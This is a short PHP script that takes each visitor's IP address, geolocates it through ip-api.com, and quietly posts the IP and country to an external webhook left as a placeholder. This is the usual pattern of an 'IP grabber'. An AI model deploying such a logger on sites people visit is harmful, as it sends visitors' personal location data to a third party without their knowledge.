<?php
$ip = $_SERVER['REMOTE_ADDR'];
$info = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
$country = $info['country'];
file_get_contents("WEBHOOK_LINK", false, stream_context_create([
    "http" => [
        "method" => "POST",
        "header" => "Content-Type: application/json",
        "content" => json_encode(["content" => "$ip -> $country"])
    ]
]));
?>